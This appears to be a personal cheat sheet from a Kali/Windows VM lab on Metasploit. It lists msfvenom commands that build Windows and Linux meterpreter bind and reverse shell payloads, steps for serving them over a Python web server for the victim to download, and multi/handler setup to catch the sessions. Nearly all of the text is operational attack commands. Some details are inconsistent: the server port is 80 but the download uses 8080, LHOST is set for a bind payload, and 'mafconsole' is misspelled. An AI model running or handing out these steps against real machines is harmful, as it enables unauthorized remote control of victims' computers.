## This windoows/meterpreter/bind_tcp payload is used when the victim is known...


1. msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f exe>pay.exe -> It makes a payload for windows with meterpreter bind shell and saves it as pay.exe

2. msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.1.22 LPORT=4444 -f elf>pay.elf -> It makes a payload for Linux with meterpreter bind shell and saves it as pay.elf

3. python3 -m http.server 80 -> It starts a simple HTTP server on port 80 to serve the payloads created above.

4. open windows vm -> chrome -> http://<kali-ip>:8080/pay.exe -> It downloads the pay.exe payload from the Kali machine to the Windows VM.

5. msfconsole

6. use exploit/multi/handler -> It uses the multi/handler exploit module in Metasploit to handle incoming connections from the payload.

7. set payload windows/meterpreter/bind_tcp -> It sets the payload to windows/meterpreter/bind_tcp to match the payload created earlier.

8. show options -> It shows the options available for the exploit module, including LHOST and LPORT.

9. set RHOST <victim-ip> -> It sets the RHOST option to the IP address of the target Windows machine.

10. set LPORT 4444 -> It sets the LPORT option to 4444, which is the port that the payload will connect back to.

11. exploit -> It runs the exploit, which will wait for the target machine to connect back to the Metasploit handler.

12. In the windows vm run the exe.

13. You will get a meterpreter session on the windows vm.

14. sysinfo -> It shows the system information of the target machine, including OS version, architecture, and hostname.

15 . help -> It shows the available commands in the meterpreter session, which can be used to interact with the target machine.





## For unknown victim

1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe>pay.exe -> It makes a payload for Windows with meterpreter reverse shell and saves it as pay.exe

2. mafconsole

3. use exploit/multi/handler -> It uses the multi/handler exploit module in Metasploit to handle incoming connections from the payload.

4. set payload windows/meterpreter/reverse_tcp -> It sets the payload to windows/meterpreter/reverse_tcp to match the payload created earlier.  

5. show options -> It shows the options available for the exploit module, including LHOST and LPORT.

6. set LHOST <kali-ip> -> It sets the LHOST option to the IP address of the Kali machine, which is where the payload will connect back to.

7. set LPORT 4444 -> It sets the LPORT option to 4444, which is the port that the payload will connect back to.

8. exploit -> It runs the exploit, which will wait for the target machine to connect back to the Metasploit handler.
